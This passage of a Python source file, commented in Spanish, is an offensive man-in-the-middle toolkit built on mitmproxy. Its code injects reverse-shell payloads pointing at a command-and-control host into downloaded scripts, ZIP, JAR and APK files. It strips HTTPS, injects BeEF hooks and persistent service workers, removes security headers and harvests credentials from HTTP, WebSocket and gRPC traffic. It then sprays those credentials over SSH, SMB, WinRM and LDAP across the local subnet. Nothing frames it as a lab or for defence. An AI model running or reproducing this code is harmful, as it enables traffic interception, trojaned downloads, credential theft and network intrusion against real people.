        self.patched_dir = output_dir / "patched_binaries"
        self.patched_dir.mkdir(exist_ok=True)
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.patched_count = 0
        self.blocked_count = 0

    def detect_file_type(self, data: bytes) -> Tuple[str, str]:
        """Detecta tipo de archivo por firma magica y extension."""
        for ftype, (magic, ext) in self.MAGIC_SIGNATURES.items():
            if data.startswith(magic):
                if ftype in ('ZIP', 'APK'):
                    # Verificar si es APK o ZIP generico
                    if b'META-INF/MANIFEST.MF' in data[:1024] or b'AndroidManifest.xml' in data[:1024]:
                        return 'APK', '.apk'
                    return 'ZIP', '.zip'
                return ftype, ext
        return 'UNKNOWN', ''

    def patch_binary(self, data: bytes, filename: str, content_type: str = "") -> Tuple[bytes, bool, str]:
        """
        Aplica patching al binario. Devuelve (datos_modificados, fue_patcheado, log_msg).
        """
        ftype, detected_ext = self.detect_file_type(data)

        # Determinar extension final
        _, ext = os.path.splitext(filename.lower())
        if not ext and detected_ext:
            ext = detected_ext

        # Scripts y archivos de texto: inyeccion directa
        if ext in ('.py', '.sh', '.js', '.rb', '.pl'):
            payload = self.PAYLOADS.get(ext, '').format(c2_host=self.c2_host, c2_port=self.c2_port)
            if payload and b'MITM-PERSIST' not in data:
                patched = data + payload.encode('utf-8')
                self.patched_count += 1
                return patched, True, f"Script {ext} patcheado con reverse shell"

        # Archivos ZIP/JAR/APK: inyeccion de archivo malicioso dentro
        if ext in ('.zip', '.jar', '.apk'):
            try:
                import zipfile
                import io
                zin = zipfile.ZipFile(io.BytesIO(data), 'r')
                zout = io.BytesIO()
                zout_f = zipfile.ZipFile(zout, 'w', zipfile.ZIP_DEFLATED)

                for item in zin.infolist():
                    zout_f.writestr(item, zin.read(item.filename))

                # Inyectar payload
                if ext == '.apk':
                    # Inyectar en smali o como asset
                    malicious_smali = b'.class public Lcom/mitm/Persist;\n.super Ljava/lang/Object;\n.method public static main([Ljava/lang/String;)V\n    .locals 0\n    return-void\n.end method'
                    zout_f.writestr('classes.dex.inject', malicious_smali)
                else:
                    payload_file = f"README.{ext[1:]}"
                    zout_f.writestr(payload_file, self.PAYLOADS['.sh'].format(c2_host=self.c2_host, c2_port=self.c2_port).encode())

                zout_f.close()
                self.patched_count += 1
                return zout.getvalue(), True, f"Archivo {ext} reempaquetado con payload"
            except Exception as e:
                log.error(f"Error patching {ext}: {e}")
                return data, False, f"Error: {e}"

        # PE32/PE64: Se requiere herramienta externa (no se modifica para evitar corrupcion)
        if ext == '.exe':
            self.blocked_count += 1
            # Guardar copia para analisis offline
            ts = int(time.time())
            copy_path = self.patched_dir / f"{filename}_{ts}.original"
            with open(copy_path, 'wb') as f:
                f.write(data)
            return data, False, f"PE detectado - copia guardada en {copy_path} (requiere patching manual)"

        return data, False, "Tipo no soportado para patching"

    def get_stats(self) -> Dict[str, int]:
        return {'patched': self.patched_count, 'blocked_saved': self.blocked_count}

class WebSocketFrameParser: # WEBSOCKET / GRPC PARSER

    # Opcodes WebSocket
    OP_CONT = 0x0
    OP_TEXT = 0x1
    OP_BINARY = 0x2
    OP_CLOSE = 0x8
    OP_PING = 0x9
    OP_PONG = 0xA

    def __init__(self, extractor: CredentialExtractor, output_dir: Path):
        self.extractor = extractor
        self.output_dir = output_dir
        self.ws_log = output_dir / f"websocket_frames_{datetime.now():%Y%m%d_%H%M%S}.jsonl"
        self.stats = {'text_frames': 0, 'binary_frames': 0, 'ping_pong': 0, 'credentials_found': 0}

    def parse_frame(self, raw_data: bytes, direction: str = "unknown") -> List[Dict[str, Any]]:
        """
        Parsea frames WebSocket desde datos brutos.
        Devuelve lista de frames decodificados.
        """
        frames = []
        offset = 0

        while offset < len(raw_data):
            if offset + 2 > len(raw_data):
                break

            byte1 = raw_data[offset]
            byte2 = raw_data[offset + 1]

            fin = (byte1 & 0x80) != 0
            opcode = byte1 & 0x0F
            masked = (byte2 & 0x80) != 0
            payload_len = byte2 & 0x7F

            header_len = 2

            if payload_len == 126:
                if offset + 4 > len(raw_data):
                    break
                payload_len = int.from_bytes(raw_data[offset+2:offset+4], 'big')
                header_len = 4
            elif payload_len == 127:
                if offset + 10 > len(raw_data):
                    break
                payload_len = int.from_bytes(raw_data[offset+2:offset+10], 'big')
                header_len = 10

            mask_key = b''
            if masked:
                if offset + header_len + 4 > len(raw_data):
                    break
                mask_key = raw_data[offset+header_len:offset+header_len+4]
                header_len += 4

            payload_start = offset + header_len
            payload_end = payload_start + payload_len

            if payload_end > len(raw_data):
                break

            payload = raw_data[payload_start:payload_end]

            if masked and mask_key:
                payload = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))

            frame_info = {
                'timestamp': datetime.now().isoformat(),
                'direction': direction,
                'opcode': opcode,
                'fin': fin,
                'masked': masked,
                'payload_len': payload_len,
                'payload_hex': payload[:200].hex(),
            }

            if opcode == self.OP_TEXT:
                try:
                    text_payload = payload.decode('utf-8', errors='ignore')
                    frame_info['payload_text'] = text_payload[:1000]
                    self.stats['text_frames'] += 1

                    # Extraer credenciales del texto
                    creds_found = self.extractor.extract_from_data(text_payload, f"WEBSOCKET_{direction}", "")
                    self.stats['credentials_found'] += creds_found

                    # Detectar JSON en frames
                    if text_payload.strip().startswith('{') or text_payload.strip().startswith('['):
                        try:
                            json_data = json.loads(text_payload)
                            frame_info['payload_json'] = json_data
                        except:
                            pass

                except Exception:
                    pass

            elif opcode == self.OP_BINARY:
                self.stats['binary_frames'] += 1

            elif opcode in (self.OP_PING, self.OP_PONG):
                self.stats['ping_pong'] += 1

            elif opcode == self.OP_CLOSE:
                frame_info['close_code'] = int.from_bytes(payload[:2], 'big') if len(payload) >= 2 else 0

            frames.append(frame_info)
            offset = payload_end

        # Loggear frames
        if frames:
            with open(self.ws_log, 'a') as f:
                for frame in frames:
                    f.write(json.dumps(frame, default=str) + '\n')

        return frames

    def get_stats(self) -> Dict[str, int]:
        return dict(self.stats)


class GRPCDetector:
    """
    Detector y parser basico de trafico gRPC sobre HTTP/2.
    Identifica llamadas gRPC por Content-Type y path,
    extrae mensajes protobuf (sin esquema de deserializacion completo).
    """

    GRPC_CONTENT_TYPES = [
        'application/grpc',
        'application/grpc+proto',
        'application/grpc+json',
        'application/grpc-web',
        'application/grpc-web+proto',
        'application/grpc-web+json',
    ]

    def __init__(self, extractor: CredentialExtractor, output_dir: Path):
        self.extractor = extractor
        self.output_dir = output_dir
        self.grpc_log = output_dir / f"grpc_calls_{datetime.now():%Y%m%d_%H%M%S}.jsonl"
        self.stats = {'calls_detected': 0, 'messages_extracted': 0}

    def is_grpc(self, headers: Dict[str, str]) -> bool:
        ct = headers.get('content-type', '')
        return any(ct.startswith(gct) for gct in self.GRPC_CONTENT_TYPES)

    def parse_grpc_message(self, data: bytes) -> List[Dict[str, Any]]:
        """
        Parsea mensajes gRPC del formato de framing:
        [flags:1][msg_len:4][msg_data:N]
        """
        messages = []
        offset = 0

        while offset < len(data):
            if offset + 5 > len(data):
                break

            flags = data[offset]
            msg_len = int.from_bytes(data[offset+1:offset+5], 'big')

            if offset + 5 + msg_len > len(data):
                break

            msg_data = data[offset+5:offset+5+msg_len]

            # Intentar detectar si es JSON o protobuf binario
            msg_info = {
                'flags': flags,
                'length': msg_len,
                'raw_hex': msg_data[:500].hex(),
            }

            # Si parece JSON (comienza con { o [)
            if msg_data and (msg_data[0:1] == b'{' or msg_data[0:1] == b'['):
                try:
                    json_data = json.loads(msg_data.decode('utf-8', errors='ignore'))
                    msg_info['json'] = json_data
                    # Extraer credenciales del JSON
                    json_str = json.dumps(json_data)
                    self.extractor.extract_from_data(json_str, "GRPC_JSON", "")
                except:
                    pass
            else:
                # Protobuf binario - buscar strings legibles
                try:
                    text = msg_data.decode('utf-8', errors='ignore')
                    # Filtrar solo caracteres imprimibles
                    printable = ''.join(c if 32 <= ord(c) < 127 else ' ' for c in text)
                    msg_info['printable_strings'] = printable[:500]
                    self.extractor.extract_from_data(printable, "GRPC_PROTO", "")
                except:
                    pass

            messages.append(msg_info)
            self.stats['messages_extracted'] += 1
            offset += 5 + msg_len

        return messages

    def log_call(self, flow, direction: str = "REQUEST"):
        """Registra una llamada gRPC detectada."""
        self.stats['calls_detected'] += 1

        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'direction': direction,
            'authority': flow.request.headers.get(':authority', flow.request.host),
            'path': flow.request.path,
            'method': flow.request.method,
            'content_type': flow.request.headers.get('content-type', ''),
            'grpc_status': flow.response.headers.get('grpc-status', '') if flow.response else '',
        }

        with open(self.grpc_log, 'a') as f:
            f.write(json.dumps(log_entry, default=str) + '\n')

        log.warning(f"[gRPC] {direction} {flow.request.path} [{flow.request.headers.get('content-type', '')}]")

    def get_stats(self) -> Dict[str, int]:
        return dict(self.stats)

class CredentialSprayer: # CREDENTIAL SPRAYING AUTOMATICO

    def __init__(self, output_dir: Path, timeout: int = 5):
        self.output_dir = output_dir
        self.timeout = timeout
        self.spray_log = output_dir / f"spray_results_{datetime.now():%Y%m%d_%H%M%S}.jsonl"
        self.stats = {
            'attempts': 0, 'successes': 0, 'failures': 0,
            'smb_success': 0, 'ssh_success': 0, 'winrm_success': 0,
            'rdp_success': 0, 'ldap_success': 0
        }
        self._lock = threading.Lock()
        self._tested_combinations: set = set()

    def _record_attempt(self, protocol: str, target: str, username: str,
                        password: str, success: bool, details: str = ""):
        entry = {
            'timestamp': datetime.now().isoformat(),
            'protocol': protocol,
            'target': target,
            'username': username,
            'password': password[:3] + '*' * (len(password) - 3) if len(password) > 3 else '*' * len(password),
            'success': success,
            'details': details
        }

        with self._lock:
            self.stats['attempts'] += 1
            if success:
                self.stats['successes'] += 1
                self.stats[f'{protocol}_success'] += 1
                log.alert(f"[SPRAY VALID] {protocol}://{username}@{target} - CREDENCIALES VALIDAS")
            else:
                self.stats['failures'] += 1

            with open(self.spray_log, 'a') as f:
                f.write(json.dumps(entry, default=str) + '\n')

    def _test_ssh(self, target: str, username: str, password: str) -> bool:
        """Prueba credenciales via SSH usando paramiko si esta disponible."""
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target, username=username, password=password,
                          timeout=self.timeout, banner_timeout=self.timeout, auth_timeout=self.timeout)
            client.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            return False

    def _test_smb(self, target: str, username: str, password: str) -> bool:
        """Prueba credenciales via SMB usando smbprotocol o impacket."""
        try:
            # Intentar con impacket smbconnection
            from impacket.smbconnection import SMBConnection
            conn = SMBConnection(target, target, sess_port=445)
            conn.login(username, password)
            conn.logoff()
            return True
        except Exception:
            pass

        try:
            # Fallback con smbclient del sistema
            result = subprocess.run(
                ['smbclient', f'//{target}/IPC$', '-U', f'{username}%{password}', '-c', 'quit'],
                capture_output=True, text=True, timeout=self.timeout
            )
            if result.returncode == 0 and 'NT_STATUS' not in result.stderr:
                return True
        except Exception:
            pass
        return False

    def _test_winrm(self, target: str, username: str, password: str) -> bool:
        """Prueba credenciales via WinRM (HTTP 5985)."""
        try:
            import requests
            from requests.auth import HTTPBasicAuth
            url = f"http://{target}:5985/wsman"
            resp = requests.post(url, auth=HTTPBasicAuth(username, password),
                               timeout=self.timeout, verify=False)
            return resp.status_code in (200, 401)  # 401 con auth valida = credenciales OK
        except Exception:
            return False

    def _test_ldap(self, target: str, username: str, password: str, domain: str = "") -> bool:
        """Prueba credenciales via LDAP."""
        try:
            import ldap3
            if domain and '\\' not in username and '@' not in username:
                username = f"{domain}\\{username}"
            server = ldap3.Server(target, get_info=ldap3.NONE, connect_timeout=self.timeout)
            conn = ldap3.Connection(server, user=username, password=password,
                                   auto_bind=False, receive_timeout=self.timeout)
            if conn.bind():
                conn.unbind()
                return True
        except Exception:
            pass
        return False

    def spray_credentials(self, credentials: List[Dict[str, str]],
                          targets: List[str], protocols: List[str] = None):
        """
        Ejecuta credential spraying contra una lista de objetivos.

        credentials: lista de dicts {'username': '...', 'password': '...'}
        targets: lista de IPs/hostnames
        protocols: lista de protocolos a probar ['ssh', 'smb', 'winrm', 'ldap']
        """
        if protocols is None:
            protocols = ['smb', 'ssh', 'winrm', 'ldap']

        log.warning(f"Iniciando Credential Spraying: {len(credentials)} credenciales x {len(targets)} objetivos x {len(protocols)} protocolos")

        threads = []
        for cred in credentials:
            username = cred.get('username', '')
            password = cred.get('password', '')

            if not username or not password:
                continue

            for target in targets:
                for protocol in protocols:
                    combo_key = f"{protocol}:{target}:{username}:{password}"
                    if combo_key in self._tested_combinations:
                        continue
                    self._tested_combinations.add(combo_key)

                    t = threading.Thread(
                        target=self._spray_single,
                        args=(protocol, target, username, password)
                    )
                    t.daemon = True
                    threads.append(t)
                    t.start()

                    # Limitar concurrencia
                    if len(threads) > 20:
                        for tt in threads:
                            tt.join(timeout=self.timeout + 2)
                        threads = []

        # Esperar threads restantes
        for t in threads:
            t.join(timeout=self.timeout + 2)

        log.warning(f"Credential Spraying completado. Exitosos: {self.stats['successes']}/{self.stats['attempts']}")

    def _spray_single(self, protocol: str, target: str, username: str, password: str):
        success = False
        details = ""

        if protocol == 'ssh':
            success = self._test_ssh(target, username, password)
        elif protocol == 'smb':
            success = self._test_smb(target, username, password)
        elif protocol == 'winrm':
            success = self._test_winrm(target, username, password)
        elif protocol == 'ldap':
            success = self._test_ldap(target, username, password)

        self._record_attempt(protocol, target, username, password, success, details)

    def auto_spray_from_findings(self, findings: List[Dict], targets: List[str] = None):
        """
        Extrae credenciales automaticamente de los hallazgos del CredentialExtractor
        y ejecuta spraying.
        """
        credentials = []

        for finding in findings:
            ftype = finding.get('type', '')
            value = finding.get('value', '')
            url = finding.get('url', '')

            # Extraer username/password de diferentes tipos de hallazgos
            if ftype == 'PASSWORD':
                # Buscar username asociado en la misma URL
                username = self._extract_username_for_url(findings, url)
                if username:
                    credentials.append({'username': username, 'password': value})
            elif ftype == 'EMAIL':
                # Email comunmente usado como username
                credentials.append({'username': value, 'password': value.split('@')[0]})
            elif ftype == 'JWT_TOKEN':
                # Decodificar JWT para extraer usuario
                try:
                    import base64
                    parts = value.split('.')
                    if len(parts) == 3:
                        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
                        username = payload.get('sub') or payload.get('username') or payload.get('email')
                        if username:
                            credentials.append({'username': username, 'password': 'jwt_extracted'})
                except:
                    pass

        # Deduplicar
        seen = set()
        unique_creds = []
        for c in credentials:
            key = f"{c['username']}:{c['password']}"
            if key not in seen:
                seen.add(key)
                unique_creds.append(c)

        if not unique_creds:
            log.warning("No se encontraron credenciales validas para spraying automatico.")
            return

        if targets is None:
            # Usar gateway y red local como targets por defecto
            net_info = NetworkScanner.get_local_info()
            targets = [net_info['ipv4'].get('gateway', '192.168.1.1')]
            # Expandir a algunos hosts comunes
            base = '.'.join(targets[0].split('.')[:3])
            targets.extend([f"{base}.{i}" for i in range(1, 20)])

        self.spray_credentials(unique_creds, targets)

    def _extract_username_for_url(self, findings: List[Dict], url: str) -> str:
        """Busca un username asociado a la misma URL donde se encontro un password."""
        for f in findings:
            if f.get('url') == url and f.get('type') in ('EMAIL', 'JWT_TOKEN'):
                val = f.get('value', '')
                if '@' in val:
                    return val.split('@')[0]
                return val
        return ""

    def get_stats(self) -> Dict[str, Any]:
        return dict(self.stats)


class InterceptAddon:
    """Addon de procesamiento de trafico mitmproxy con capacidades de evasion, hooking y SSL/TLS Spoofing"""

    def __init__(self, mode: str = "capture", output_dir: str = "/tmp/mitm_operation",
                 beef_hook_url: str = "", enable_sw: bool = False,
                 enable_binary_patch: bool = False, enable_ws_grpc: bool = False,
                 enable_spray: bool = False, c2_host: str = "10.9.0.1", c2_port: int = 4444):
        self.mode = mode
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.beef_hook_url = beef_hook_url

        self.extractor = CredentialExtractor(self.output_dir)
        self.stats = {
            'requests': 0, 'downloads': 0, 'forms': 0,
            'ssl_strip': 0, 'beef_hooks': 0, 'csp_bypass': 0,
            'tls_handshakes_intercepted': 0, 'tls_sni_log': 0,
            'tls_failed_pinning': 0, 'tls_successful_spoof': 0,
            'sw_injected': 0, 'binaries_patched': 0, 'ws_frames': 0,
            'grpc_calls': 0, 'spray_attempts': 0, 'spray_successes': 0
        }

        self.download_dir = self.output_dir / "exfiltrated_files"
        self.download_dir.mkdir(exist_ok=True)
        self.traffic_log = self.output_dir / f"traffic_raw_{datetime.now():%Y%m%d_%H%M%S}.jsonl"
        self.tls_log = self.output_dir / f"tls_handshakes_{datetime.now():%Y%m%d_%H%M%S}.jsonl"

        # Nuevos motores post-explotacion
        self.sw_injector = ServiceWorkerInjector() if enable_sw else None
        self.binary_patcher = BinaryPatcher(self.output_dir, c2_host, c2_port) if enable_binary_patch else None
        self.ws_parser = WebSocketFrameParser(self.extractor, self.output_dir) if enable_ws_grpc else None
        self.grpc_detector = GRPCDetector(self.extractor, self.output_dir) if enable_ws_grpc else None
        self.cred_sprayer = CredentialSprayer(self.output_dir) if enable_spray else None

        if self.beef_hook_url:
            log.alert(f"Motor BeEF activado. Hook URL: {self.beef_hook_url}")
        if self.sw_injector:
            log.alert("Motor Service Worker Injection activado (persistencia web)")
        if self.binary_patcher:
            log.alert(f"Motor Binary Patching activado (C2: {c2_host}:{c2_port})")
        if self.ws_parser:
            log.alert("Motor WebSocket/gRPC Parser activado")
        if self.cred_sprayer:
            log.alert("Motor Credential Spraying automatico activado")

    def _log_request(self, flow: http.HTTPFlow):
        with open(self.traffic_log, 'a') as f:
            log_data = {'ts': datetime.now().isoformat(), 'method': flow.request.method, 'url': flow.request.pretty_url, 'status': flow.response.status_code if flow.response else 0, 'size': len(flow.response.content) if flow.response and flow.response.content else 0}
            f.write(json.dumps(log_data) + '\n')

    def _bypass_security_headers(self, flow: http.HTTPFlow):
        modified = False
        csp_headers = ['content-security-policy', 'x-content-security-policy', 'x-webkit-csp']
        for header in csp_headers:
            if header in flow.response.headers:
                del flow.response.headers[header]
                modified = True
        if 'x-frame-options' in flow.response.headers:
            del flow.response.headers['x-frame-options']
            modified = True
        if modified:
            self.stats['csp_bypass'] += 1
        return modified

    def _inject_beef_hook(self, html_content: str) -> str:
        hook_script = f'<script src="{self.beef_hook_url}"></script>'
        if '<head>' in html_content.lower():
            regex = re.compile(r'(<head[^>]*>)', re.I)
            return regex.sub(r'\1' + hook_script, html_content, count=1)
        elif '</body>' in html_content.lower():
            return html_content.replace('</body>', hook_script + '</body>')
        return html_content + hook_script

    def tls_clienthello(self, flow: tls.TlsData):
        self.stats['tls_handshakes_intercepted'] += 1
        client_hello = flow.client_hello
        if client_hello:
            sni = client_hello.sni
            cipher_suites = client_hello.cipher_suites
            tls_version = client_hello.version_min if client_hello.version_min else "Unknown"

            self.stats['tls_sni_log'] += 1
            log.warning(f"[TLS SNI] Conexion cifrada hacia: {sni}")
            log.debug(f"[TLS INFO] Version: {tls_version} | Ciphers ({len(cipher_suites)}): {cipher_suites[:3]}...")

            with open(self.tls_log, 'a') as f:
                tls_data = {
                    'ts': datetime.now().isoformat(),
                    'event': 'CLIENT_HELLO',
                    'sni': sni,
                    'version': str(tls_version),
                    'ciphers_count': len(cipher_suites) if cipher_suites else 0
                }
                f.write(json.dumps(tls_data) + '\n')

    def tls_established(self, flow: tls.TlsData):
        if flow.server_cert:
            cert = flow.server_cert
            self.stats['tls_successful_spoof'] += 1
            log.alert(f"[TLS SPOOFED] Tunnel interceptado para: {cert.cn}")
            log.debug(f"[TLS SPOOF] Emitido por: {cert.issuer}")

    def tls_failed_client(self, flow: tls.TlsData):
        self.stats['tls_failed_pinning'] += 1
        log.error(f"[TLS BLOCKED] Pinning detectado! La victima rechazo la CA falsa para: {flow.client_hello.sni if flow.client_hello else 'Unknown'}")

    def request(self, flow: http.HTTPFlow) -> None:
        self.stats['requests'] += 1
        url = flow.request.pretty_url
        proto = "IPv6" if flow.request.host.startswith('[') else "IPv4"
        log.info(f"[REQ][{proto}] {flow.request.method} {url[:120]}")

        # Detectar WebSocket upgrade
        upgrade = flow.request.headers.get('upgrade', '').lower()
        if upgrade == 'websocket' and self.ws_parser:
            log.alert(f"[WS UPGRADE] WebSocket detectado: {url}")

        # Detectar gRPC
        if self.grpc_detector and self.grpc_detector.is_grpc(dict(flow.request.headers)):
            self.grpc_detector.log_call(flow, "REQUEST")
            if flow.request.content:
                messages = self.grpc_detector.parse_grpc_message(flow.request.content)
                self.stats['grpc_calls'] += 1
                log.debug(f"[gRPC] {len(messages)} mensajes parseados en request")

        self.extractor.check_headers(dict(flow.request.headers), url)
        if flow.request.content:
            try:
                body = flow.request.content.decode('utf-8', errors='ignore')
                self.extractor.extract_from_data(body, "REQUEST_BODY", url)
                # Parsear WebSocket frames si el body contiene datos de WS
                if self.ws_parser and len(flow.request.content) > 5:
                    frames = self.ws_parser.parse_frame(flow.request.content, "CLIENT_TO_SERVER")
                    if frames:
                        self.stats['ws_frames'] += len(frames)
            except Exception: pass

    def response(self, flow: http.HTTPFlow) -> None:
        if not flow.response: return
        status, url = flow.response.status_code, flow.request.pretty_url
        content_type = flow.response.headers.get("content-type", "")
        log.info(f"[RES] {status} {url[:100]}")

        # Responder a peticiones del Service Worker
        if self.sw_injector and '/mitm-sw.js' in flow.request.path:
            body, headers = self.sw_injector.get_sw_response()
            flow.response.status_code = 200
            flow.response.content = body
            for h, v in headers.items():
                flow.response.headers[h] = v
            log.alert(f"[SW SERVE] Service Worker servido a {flow.client_conn.address}")
            return

        # gRPC response
        if self.grpc_detector and self.grpc_detector.is_grpc(dict(flow.response.headers)):
            self.grpc_detector.log_call(flow, "RESPONSE")
            if flow.response.content:
                messages = self.grpc_detector.parse_grpc_message(flow.response.content)
                self.stats['grpc_calls'] += 1
                log.debug(f"[gRPC] {len(messages)} mensajes parseados en response")

        self._capture_downloads(flow)
        if "text/html" in content_type: self._process_html(flow)
        if flow.response.content:
            try:
                body = flow.response.content.decode('utf-8', errors='ignore')
                self.extractor.extract_from_data(body, "RESPONSE_BODY", url)
                # Parsear WebSocket frames en respuesta
                if self.ws_parser and len(flow.response.content) > 5:
                    frames = self.ws_parser.parse_frame(flow.response.content, "SERVER_TO_CLIENT")
                    if frames:
                        self.stats['ws_frames'] += len(frames)
            except Exception: pass
        self._log_request(flow)

    def _process_html(self, flow: http.HTTPFlow):
        try:
            html = flow.response.content.decode('utf-8', errors='ignore')
            modified = False
            origin = flow.request.scheme + "://" + flow.request.host

            if '<form' in html.lower():
                self.stats['forms'] += 1

            # Service Worker Injection (persistencia web)
            if self.sw_injector and self.mode in ("inject", "full"):
                html = self.sw_injector.inject(html, origin)
                if self.sw_injector.injected_count > self.stats['sw_injected']:
                    self.stats['sw_injected'] = self.sw_injector.injected_count
                    modified = True

            if self.mode in ("sslstrip", "full"):
                if 'https://' in html:
                    html = html.replace('https://', 'http://').replace('wss://', 'ws://')
                    modified = True; self.stats['ssl_strip'] += 1

            if self.mode in ("inject", "full"):
                if self.beef_hook_url:
                    html = self._inject_beef_hook(html)
                    modified = True; self.stats['beef_hooks'] += 1
                    self._bypass_security_headers(flow)
                else:
                    if '</body>' in html.lower():
                        html = html.replace('</body>', '<script>alert("INTERCEPTED")</script></body>')
                        modified = True

            if modified:
                flow.response.content = html.encode('utf-8', errors='ignore')
                flow.response.headers["content-length"] = str(len(flow.response.content))
        except Exception as e: log.error(f"Error procesamiento HTML: {e}")

    def _capture_downloads(self, flow: http.HTTPFlow):
        disposition = flow.response.headers.get("content-disposition", "")
        ct = flow.response.headers.get("content-type", "")
        is_binary_download = "attachment" in disposition or any(doc in ct for doc in [
            "application/pdf", "application/zip", "application/x-rar", "application/octet-stream",
            "application/vnd.android.package-archive", "application/x-msdownload",
            "application/x-dmg", "application/x-debian-package", "application/x-rpm",
            "text/x-python", "application/x-sh", "application/javascript"
        ])

        if is_binary_download and flow.response.content:
            match = re.search(r'filename[^;=\n]*=["\']?([^"\';\n]+)', disposition, re.I)
            filename = match.group(1).strip() if match else f"file_{int(time.time())}"
            safe_filename = re.sub(r'[^\w\.\-]', '_', filename)

            # Binary Patching: intentar modificar el binario antes de entregarlo
            if self.binary_patcher:
                patched_data, was_patched, patch_msg = self.binary_patcher.patch_binary(
                    flow.response.content, safe_filename, ct
                )
                if was_patched:
                    flow.response.content = patched_data
                    flow.response.headers["content-length"] = str(len(flow.response.content))
                    self.stats['binaries_patched'] += 1
                    log.alert(f"[PATCH] {safe_filename} - {patch_msg}")
                else:
                    log.warning(f"[PATCH SKIP] {safe_filename} - {patch_msg}")

            try:
                with open(self.download_dir / safe_filename, 'wb') as f: f.write(flow.response.content)
                self.stats['downloads'] += 1
                log.warning(f"[EXFIL] Descarga interceptada: {safe_filename}")
            except Exception as e: log.error(f"Error guardando archivo: {e}")

    def done(self):
        creds_file = self.extractor.dump_to_file()
        summary = self.extractor.get_findings_summary()

        # Activar Credential Spraying automatico si esta habilitado
        if self.cred_sprayer and self.extractor.findings:
            log.warning("Iniciando Credential Spraying post-captura...")
            self.cred_sprayer.auto_spray_from_findings(self.extractor.findings)
            spray_stats = self.cred_sprayer.get_stats()
            self.stats['spray_attempts'] = spray_stats['attempts']
            self.stats['spray_successes'] = spray_stats['successes']

        print("\n" + "="*60)
        print("  OPERACIONES")
        print("="*60)
        print(f"  Peticiones interceptadas:   {self.stats['requests']}")
        print(f"  Credenciales/Datos hallados:{len(self.extractor.findings)}")
        print("  --- Desglose de Extracciones ---")
        for k, v in summary.items():
            print(f"    - {k}: {v}")
        print("  --- Otros Datos ---")
        print(f"  Archivos exfiltrados:       {self.stats['downloads']}")
        print(f"  Formularios identificados:  {self.stats['forms']}")
        print(f"  Ataques SSL Strip:          {self.stats['ssl_strip']}")
        print("  --- SSL/TLS SPOOFING ---")
        print(f"  TLS Client Hello capturados:{self.stats['tls_handshakes_intercepted']}")
        print(f"  Certificados Falsos OK:     {self.stats['tls_successful_spoof']}")
        print(f"  Certificados Bloqueados:    {self.stats['tls_failed_pinning']}")
        print("  --- POST-EXPLOTACION AVANZADA ---")
        print(f"  Service Workers inyectados: {self.stats['sw_injected']}")
        print(f"  Binarios patcheados:        {self.stats['binaries_patched']}")
        print(f"  Frames WebSocket parseados: {self.stats['ws_frames']}")
        print(f"  Llamadas gRPC detectadas:   {self.stats['grpc_calls']}")
        print(f"  Spray attempts:             {self.stats['spray_attempts']}")
        print(f"  Spray exitosos:             {self.stats['spray_successes']}")
        print("="*60)
        print(f"  Credenciales: {creds_file}")
        print("="*60)

#  OUI DB PARA OS FINGERPRINTING
MAC_OUI_VENDORS = {
    "00:50:56": "VMware", "00:0C:29": "VMware", "00:05:69": "VMware", "00:1C:14": "VMware",
    "00:15:5D": "Hyper-V", "00:03:FF": "Microsoft Virtual PC",
    "08:00:27": "VirtualBox", "0A:00:27": "VirtualBox",
    "00:1C:42": "Parallels",
    "00:1D:D8": "Apple (iOS)", "A4:83:E7": "Apple (macOS/iOS)", "3C:22:FB": "Apple",
    "AC:87:A3": "Apple", "78:CA:39": "Apple", "F0:18:98": "Apple",
    "DC:A6:32": "Raspberry Pi", "B8:27:EB": "Raspberry Pi",
    "E4:5F:01": "Samsung (Android/Tizen)", "58:2A:F7": "Samsung",
    "A0:CB:FD": "Android", "DC:2B:2A": "Android", "44:65:0D": "Android",
    "F0:18:98": "Android", "98:F5:A9": "Android", "B4:99:BA": "Android",
    "00:11:32": "Microsoft", "00:15:5D": "Microsoft (Hyper-V)",
    "7C:ED:8D": "Microsoft Surface", "00:0D:3A": "Microsoft",
    "00:1A:2B": "Cisco", "F8:B1:56": "Cisco Meraki", "CC:96:A0": "Cisco",
    "EC:1F:72": "TP-Link", "50:C7:BF": "TP-Link", "C0:56:E3": "TP-Link",
    "D8:32:14": "Netgear", "60:38:E0": "Netgear",
    "00:26:5E": "Intel", "3C:97:0E": "Intel", "F8:FF:0A": "Intel",
    "A4:4C:C8": "Espressif (ESP32/IoT)", "30:AE:A4": "Espressif (ESP32/IoT)",
    "B8:27:EB": "Raspberry Pi Foundation"
}

class NetworkScanner: #  ESCANER DE RED DUAL STACK CON INFERENCIA DE OS
    @staticmethod
    def get_local_info() -> Dict[str, Any]:
        info = {'ipv4': {}, 'ipv6': {}, 'interface': None}
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("8.8.8.8", 80))
            info['ipv4']['local_ip'] = s.getsockname()[0]; s.close()
        except Exception: info['ipv4']['local_ip'] = "127.0.0.1"
        res = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True)
        if res.stdout:
            parts = res.stdout.split()
            info['ipv4']['gateway'] = parts[2] if len(parts) > 2 else "192.168.1.1"
            info['interface'] = parts[4] if len(parts) > 4 else "eth0"
        else: info['ipv4']['gateway'] = "192.168.1.1"; info['interface'] = "eth0"
        info['ipv4']['network'] = ".".join(info['ipv4']['local_ip'].split(".")[:3]) + ".0/24"
        res_v6 = subprocess.run(["ip", "-6", "route", "show", "default"], capture_output=True, text=True)
        if res_v6.stdout:
            p = res_v6.stdout.split()
            info['ipv6']['gateway'] = p[2].split('%')[0] if len(p) > 2 else "fe80::1"
        res_addr = subprocess.run(["ip", "-6", "addr", "show", info['interface']], capture_output=True, text=True)
        if res_addr.stdout:
            v6s = re.findall(r'inet6\s+([0-9a-fA-F:]+)', res_addr.stdout)
            info['ipv6']['global'] = [m for m in v6s if not m.startswith('fe80')]
            ll = [m for m in v6s if m.startswith('fe80')]
            if ll: info['ipv6']['link_local'] = ll[0]
        return info

    @staticmethod
    def infer_os_from_mac(mac: str) -> str:
        oui = mac.upper()[:8]
        return MAC_OUI_VENDORS.get(oui, "Dispositivo de Red Fisico/Desconocido")

    @staticmethod
    def scan_hosts(network: str, interface: str, ip_version: int = 4) -> List[Dict]:
